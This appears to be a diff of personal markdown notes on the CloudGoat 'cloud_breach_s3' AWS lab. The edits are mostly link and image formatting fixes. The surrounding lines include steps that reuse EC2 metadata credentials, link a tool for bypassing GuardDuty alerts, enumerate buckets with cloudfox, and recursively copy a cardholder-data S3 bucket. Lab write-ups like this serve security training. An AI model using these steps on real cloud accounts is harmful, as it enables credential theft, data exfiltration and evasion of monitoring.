@@ -2,7 +2,7 @@
 
 ##### This scenario starts off by providing a public IP address for the targeted EC2 instance. After querying the instance's metadata service, the credentials can be used to obtain sensitive data in S3 buckets.
 
-[https://rhinosecuritylabs.com/aws/capital-one-cloud_breach_s3-cloudgoat/]
+[CloudGoat Scenario](https://rhinosecuritylabs.com/aws/capital-one-cloud_breach_s3-cloudgoat/)
 
 ![[cloud_breach_s3_CloudGoat_Scenario.png]]
 
@@ -46,9 +46,9 @@ aws sts get-caller-identity --profile s3_breach
 
 - Bypassing GuardDuty Alerts
 
-[https://github.com/Frichetten/SneakyEndpoints]
+[SneakyEndpoints to hide from GuardDuty](https://github.com/Frichetten/SneakyEndpoints)
 
-[[GuardDuty IAM finding types - Amazon GuardDuty.png]]
+![[GuardDuty IAM finding types - Amazon GuardDuty.png]]
 
 ![[GuardDuty IAM finding types - Amazon GuardDuty_2.png]]
 
@@ -69,7 +69,7 @@ aws ssm start-session --tasrget "instance id"
 ./cloudfox aws --profile s3_breach -v2 buckets
 ```
 
-![[cloud_breach_s3]]
+![[cloud_breach_s3_CloudGoat_Scenario.png]]
 
 ```bash
 aws --profile $profile s3 cp s3://cg-cardholder-data-bucket-cloud-breach-s3-cgida870e58dn2/ ./s3-buckets/cg-cardholder-data-bucket-cloud-breach-s3-cgida870e58dn2 --recursive
